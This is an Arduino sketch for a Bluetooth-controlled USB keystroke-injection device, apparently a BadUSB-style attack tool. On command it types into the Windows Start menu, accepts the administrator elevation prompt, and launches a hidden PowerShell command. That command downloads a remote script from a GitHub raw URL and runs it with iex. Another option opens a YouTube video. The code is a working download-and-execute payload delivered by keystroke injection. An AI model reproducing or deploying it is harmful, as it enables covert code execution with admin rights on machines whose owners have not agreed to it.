void runCmd(char cmdString[]){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println(cmdString);
}

void runCmdAsAdmin(char cmdString[]){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print(cmdString);
  delay(1800);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
}



void setup() {
  Serial3.begin (9600);
}

void loop() {
  char btRead;
  if (Serial3.available ()) {  
    btRead = Serial3.read();
    if(btRead == '1'){
       runCmdAsAdmin("powershell -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
       Serial3.println("\r\nPayload 1 sent");
    }
    if(btRead == '2'){
       runCmd("powershell -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
       Serial3.print("\r\nPayload 2 sent\r\n");
    }
    else if(btRead == '3'){
       runCmd("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
       Serial3.print("\r\nPayload 3 sent\r\n");
    }
  }
}
